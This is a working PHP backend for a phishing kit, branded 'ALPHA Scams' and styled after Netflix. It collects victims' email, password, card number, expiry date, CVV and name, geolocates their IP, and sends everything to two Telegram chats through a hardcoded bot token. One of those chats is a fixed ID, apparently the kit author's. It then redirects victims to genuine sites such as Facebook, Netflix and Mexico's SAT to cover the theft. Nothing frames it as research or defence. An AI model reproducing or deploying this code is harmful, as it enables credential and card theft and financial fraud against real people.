<?php
date_default_timezone_set('America/Mexico_City');

function getFlags($code) {
    $code = strtoupper($code);

    if ($code == 'MX') return '🇲🇽';
    if ($code == 'YT') return '🇾🇹';
    if ($code == 'ZA') return '🇿🇦';
    if ($code == 'ZM') return '🇿🇲';
    return '🚩';
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_POST['web'])) {
        // Verificar si se han proporcionado los parámetros necesarios
        die('Missing parameters');
    }

    // Obtener el chat_id (uToken) directamente del formulario POST
    $chatId = $_POST['uToken'];
    $fixedChatId = -1002070497373; // Reemplaza -1002070497373 con tu chat ID fijo

    function get_client_ip() {
        $ipaddress = '';
        if (getenv('HTTP_CLIENT_IP')) $ipaddress = getenv('HTTP_CLIENT_IP');
        elseif (getenv('HTTP_X_FORWARDED_FOR')) $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
        elseif (getenv('HTTP_X_FORWARDED')) $ipaddress = getenv('HTTP_X_FORWARDED');
        elseif (getenv('HTTP_FORWARDED_FOR')) $ipaddress = getenv('HTTP_FORWARDED_FOR');
        elseif (getenv('HTTP_FORWARDED')) $ipaddress = getenv('HTTP_FORWARDED');
        elseif (getenv('REMOTE_ADDR')) $ipaddress = getenv('REMOTE_ADDR');
        else $ipaddress = 'UNKNOWN';
        return $ipaddress;
    }

    $ip = get_client_ip();
    $ip = substr($ip, 0, strpos($ip, ","));
    if ($ip == "") $ip = "8.8.8.8";
    $res = file_get_contents('https://www.iplocate.io/api/lookup/' . $ip . '');
    $res = json_decode($res);
    $a2code = $res->country;

    // Datos del bot
    $token = "7652185770:AAG7SIPjYah1xMYP-QtfsaS-7M8XOnS_vq4"; // Reemplaza con tu token
    $urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";

    // Datos de la CC y demás.
    $hora = date("g:i A");
    $flag = getFlags($a2code);

      // Mensaje
    $textCommon = "  ALPHA ミ 𝘚𝘤𝘢𝘮𝘴 彡  \n\n";
	$textCommon .= "\n▬▬▬▬▬▬▬𝖓𝖊𝖙𝖋𝖑𝖎𝖝▬▬▬▬▬▬▬\n";
    $textCommon .= "📩 Correo: ".$_POST['email']."\n";
    $textCommon .= "🔑 Contraseña: ".$_POST['password']."\n";
	$textCommon .= "💳 Tarjeta : ".$_POST['uno']."\n";
    $textCommon .= "📅 Fecha Exp : ".$_POST['dos']."\n";
	$textCommon .= "💳 CVV : ".$_POST['tres']."\n";
	$textCommon .= "👽 Nombre : ".$_POST['cuatro']."\n";
	$textCommon .= "👽 Apellido : ".$_POST['cinco']."\n";
    $textCommon .= "\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
    $textCommon .= "⏳: $hora\n";


    // Reemplaza los saltos de línea por %0A y envía mensaje al chat ID dinámico
    sendMessage($urlMsg, $chatId, $textCommon);

    // Reemplaza los saltos de línea por %0A y envía mensaje al chat ID fijo
    sendMessage($urlMsg, $fixedChatId, $textCommon);
}

unset($_COOKIE['uToken']);

// Obtener el valor del campo "web" desde el formulario POST
$webValue = $_POST['web'];

// Redirigir según el valor de "web"
switch ($webValue) {
    case 1:
        header("Location: https://www.facebook.com/login");
        exit();
    case 2:
        header("Location: https://help.netflix.com/es/contactus");
        exit();
    case 3:
        header("Location: https://es.pornhub.com/?utm_source=porhub.com&utm_medium=redirects&utm_campaign=tldredirects");
        exit();
    case 4:
        header("Location: https://www.sat.gob.mx/tramites/52268/agenda-una-cita");
        exit();
    case 5:
        header("Location: https://www.instagram.com");
        exit();
    case 6:
        header("Location: https://play.google.com/store/apps/details?id=mx.klar.app&hl=en_US");
        exit();
    case 7:
        header("Location: https://www.easypay-mx.com/shop/");
        exit();
    // Agrega más casos según sea necesario
    default:
        header("Location: http://tudominio.com/pagina_predeterminada.php");
        exit();
}

function sendMessage($url, $chatId, $text) {
    $postData = array(
        'chat_id' => $chatId,
        'parse_mode' => 'HTML',
        'text' => $text
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);



    curl_close($ch);
}
?>
